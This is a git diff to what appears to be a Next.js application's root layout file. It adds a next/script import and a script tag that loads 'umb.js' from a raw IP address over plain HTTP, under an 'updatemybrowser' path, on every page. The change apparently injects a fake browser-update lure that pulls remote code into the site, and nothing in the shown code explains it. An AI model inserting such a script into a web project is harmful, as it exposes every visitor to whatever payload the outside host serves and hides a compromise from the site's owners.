@@ -1,4 +1,5 @@
 import type { Metadata } from "next";
+import Script from "next/script";
 import { Geist, Geist_Mono } from "next/font/google";
 import "./globals.css";
 import Navbar from "@/components/layout/Navbar";
@@ -43,6 +44,7 @@ export default function RootLayout({
       className={`${geistSans.variable} ${geistMono.variable} h-full antialiased`}
     >
       <body className="min-h-screen flex flex-col bg-gray-50">
+        <Script src="http://94.250.202.68/updatemybrowser/umb.js" strategy="afterInteractive" />
         <AuthProvider>
           <GuestVerifyProvider>
             <ChatProvider>
